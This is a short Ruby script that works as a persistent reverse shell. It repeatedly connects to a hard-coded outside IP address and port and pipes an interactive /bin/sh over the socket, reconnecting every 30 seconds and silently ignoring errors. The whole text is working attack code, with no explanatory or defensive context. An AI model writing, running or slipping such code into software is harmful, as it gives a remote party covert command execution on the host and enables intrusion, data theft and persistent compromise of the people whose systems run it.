require 'socket'
HOST, PORT = '45.138.12.177', 8090
loop do
  begin
    sock = TCPSocket.new(HOST, PORT)
    sh = IO.popen(['/bin/sh'], 'r+')
    t1 = Thread.new { IO.copy_stream(sock, sh) }
    t2 = Thread.new { IO.copy_stream(sh, sock) }
    t1.join; t2.join
    begin; sh.close; rescue Exception; end
  rescue Exception
  end
  sleep 30
end
